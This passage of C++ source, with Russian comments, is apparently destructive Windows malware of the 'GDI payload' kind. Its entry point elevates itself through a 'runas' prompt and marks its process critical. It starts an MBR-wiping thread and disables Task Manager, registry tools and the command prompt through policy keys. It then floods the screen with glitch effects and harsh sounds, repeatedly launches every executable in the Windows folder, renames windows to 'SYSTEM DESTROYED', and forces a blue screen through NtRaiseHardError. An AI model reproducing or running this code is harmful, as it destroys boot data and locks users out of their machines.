    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(dcCopy, rand() % 10, rand() % 12, w, h, hdc, rand() % -10, rand() % -12, SRCPAINT);
        AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI opener(LPVOID lpParam) {
    WIN32_FIND_DATAA data;
    while (true) {
        HANDLE find = FindFirstFileA("C:\\WINDOWS\\*.exe", &data);
        if (find != INVALID_HANDLE_VALUE) {
            ShellExecuteA(0, "open", data.cFileName, 0, 0, SW_SHOW);
            while (FindNextFileA(find, &data)) {
                ShellExecuteA(0, "open", data.cFileName, 0, 0, SW_SHOW);
                Sleep(rand() % 10000);
            }
            FindClose(find);
        }
    }
}

DWORD WINAPI WindowsCorruptionPayload(LPVOID lpParam) {
    while (1) {
        EnumChildWindows(NULL, [](HWND hwnd, LPARAM lParam) -> BOOL {
            SendMessageTimeoutA(hwnd, WM_SETTEXT, NULL, (LPARAM)"SYSTEM DESTROYED", SMTO_ABORTIFHUNG, 100, NULL);
            return TRUE;
        }, NULL);
        Sleep(100);
    }
}

DWORD WINAPI texts(LPVOID lpParam) {
    while (true) {
        EnumChildWindows(GetDesktopWindow(), [](HWND hwnd, LPARAM lParam) -> BOOL {
            SendMessageTimeoutA(hwnd, WM_SETTEXT, NULL, (LPARAM)"SYSTEM CORRUPTED", SMTO_ABORTIFHUNG, 100, NULL);
            return TRUE;
        }, NULL);
        Sleep(50);
    }
}

// ==================== ЗВУКИ ====================
VOID WINAPI sound1() { HWAVEOUT hWaveOut = 0; WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 }; waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); char buffer[16000 * 30] = {}; for (DWORD t = 0; t < sizeof(buffer); ++t) buffer[t] = static_cast<char>(6 & t) * (t >> 6) * (t >> 8) ^ (t >> 8); WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 }; waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR)); waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutClose(hWaveOut); }
VOID WINAPI sound2() { HWAVEOUT hWaveOut = 0; WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 }; waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); char buffer[16000 * 30] = {}; for (DWORD t = 0; t < sizeof(buffer); ++t) buffer[t] = static_cast<char>(t & t) * (t & t >> 8) ^ (t >> 5 | t); WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 }; waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR)); waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutClose(hWaveOut); }
VOID WINAPI sound3() { HWAVEOUT hWaveOut = 0; WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 }; waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); char buffer[8000 * 30] = {}; for (DWORD t = 0; t < sizeof(buffer); ++t) buffer[t] = static_cast<char>(t ^ t >> 8 | 5) * (t ^ t >> 6); WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 }; waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR)); waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutClose(hWaveOut); }
VOID WINAPI sound4() { HWAVEOUT hWaveOut = 0; WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 }; waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); char buffer[8000 * 30] = {}; for (DWORD t = 0; t < sizeof(buffer); ++t) buffer[t] = static_cast<char>(12 * t) | (3 * t >> 6) * (3 * t >> 8); WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 }; waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR)); waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutClose(hWaveOut); }
VOID WINAPI sound5() { HWAVEOUT hWaveOut = 0; WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 }; waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); char buffer[8000 * 30] = {}; for (DWORD t = 0; t < sizeof(buffer); ++t) buffer[t] = static_cast<char>((2 * t * t >> 4) - (3 * t >> 7) | (5 & t >> 8 * t) + (2 + t ^ t >> 8) * t); WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 }; waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR)); waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutClose(hWaveOut); }
VOID WINAPI sound6() { HWAVEOUT hWaveOut = 0; WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 }; waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); char buffer[8000 * 30] = {}; for (DWORD t = 0; t < sizeof(buffer); ++t) buffer[t] = static_cast<char>(t ^ t >> 8) * (t & t >> 8); WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 }; waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR)); waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutClose(hWaveOut); }
VOID WINAPI sound7() { HWAVEOUT hWaveOut = 0; WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 }; waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); char buffer[8000 * 30] = {}; for (DWORD t = 0; t < sizeof(buffer); ++t) buffer[t] = static_cast<char>(t ^ t >> 8) * tan(t & t >> 8); WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 }; waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR)); waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutClose(hWaveOut); }
VOID WINAPI sound8() { HWAVEOUT hWaveOut = 0; WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 }; waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); char buffer[8000 * 30] = {}; for (DWORD t = 0; t < sizeof(buffer); ++t) buffer[t] = static_cast<char>(t * ((t >> 7 | t >> 9) & 30) & t << 3); WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 }; waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR)); waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR)); waveOutClose(hWaveOut); }

// ==================== ТОЧКА ВХОДА ====================
int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    BOOL bIsAdmin = FALSE;
    PSID pAdmin = NULL;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdmin)) {
        CheckTokenMembership(NULL, pAdmin, &bIsAdmin);
        FreeSid(pAdmin);
    }
    
    if (!bIsAdmin) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        SHELLEXECUTEINFOA sei = {sizeof(sei)};
        sei.lpVerb = "runas";
        sei.lpFile = path;
        sei.nShow = SW_HIDE;
        ShellExecuteExA(&sei);
        ExitProcess(0);
    }
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    ProcessIsCritical();
    CreateThread(0, 0, MBRWiper, 0, 0, 0);
    
    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", REG_DWORD, 1);
    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", REG_DWORD, 1);
    reg_add(HKEY_CURRENT_USER, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DisableCMD", REG_DWORD, 2);
    
    CreateThread(0, 0, texts, 0, 0, 0);
    Sleep(1000);

    // Оригинальные эффекты
    HANDLE t1 = CreateThread(0, 0, shader1, 0, 0, 0); sound1(); Sleep(30000); TerminateThread(t1, 0); CloseHandle(t1);
    HANDLE t2 = CreateThread(0, 0, shader2, 0, 0, 0); sound2(); Sleep(30000); TerminateThread(t2, 0); CloseHandle(t2);
    HANDLE t3 = CreateThread(0, 0, SrcinvertCombo, 0, 0, 0);
    HANDLE t4 = CreateThread(0, 0, textout1, 0, 0, 0);
    sound3(); Sleep(30000); TerminateThread(t3, 0); CloseHandle(t3);
    HANDLE t5 = CreateThread(0, 0, blur1, 0, 0, 0); sound4(); Sleep(30000); TerminateThread(t5, 0); CloseHandle(t5);
    HANDLE t6 = CreateThread(0, 0, blur2, 0, 0, 0);
    HANDLE t7 = CreateThread(0, 0, opener, 0, 0, 0);
    sound5(); Sleep(30000); TerminateThread(t6, 0); CloseHandle(t6); TerminateThread(t4, 0); CloseHandle(t4); TerminateThread(t7, 0); CloseHandle(t7);
    HANDLE t8 = CreateThread(0, 0, shader3, 0, 0, 0); sound6(); Sleep(30000); TerminateThread(t8, 0); CloseHandle(t8);
    HANDLE t9 = CreateThread(0, 0, shader4, 0, 0, 0); sound7(); Sleep(30000); TerminateThread(t9, 0); CloseHandle(t9);
    HANDLE t10 = CreateThread(0, 0, sines, 0, 0, 0);
    HANDLE t11 = CreateThread(0, 0, WindowsCorruptionPayload, 0, 0, 0);
    sound8(); Sleep(30000); TerminateThread(t10, 0); CloseHandle(t10); TerminateThread(t11, 0); CloseHandle(t11);
    HANDLE t12 = CreateThread(0, 0, shader5, 0, 0, 0); Sleep(5000);

    // Новые эффекты
    HANDLE t13 = CreateThread(0, 0, rgbhell2, 0, 0, 0); Sleep(15000); TerminateThread(t13, 0); CloseHandle(t13);
    HANDLE t14 = CreateThread(0, 0, screenrip, 0, 0, 0); Sleep(15000); TerminateThread(t14, 0); CloseHandle(t14);
    HANDLE t15 = CreateThread(0, 0, animnoise, 0, 0, 0); Sleep(15000); TerminateThread(t15, 0); CloseHandle(t15);
    HANDLE t16 = CreateThread(0, 0, mirrorchaos, 0, 0, 0); Sleep(15000); TerminateThread(t16, 0); CloseHandle(t16);
    HANDLE t17 = CreateThread(0, 0, pixelburst, 0, 0, 0); Sleep(15000); TerminateThread(t17, 0); CloseHandle(t17);
    HANDLE t18 = CreateThread(0, 0, shiftxor, 0, 0, 0); Sleep(15000); TerminateThread(t18, 0); CloseHandle(t18);

    // BSOD
    BOOLEAN bl;
    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege(19, 1, 0, &bl);
    NtRaiseHardError(0xC0000229, 0, 0, 0, 6, NULL);
    Sleep(-1);
    return 0;
}
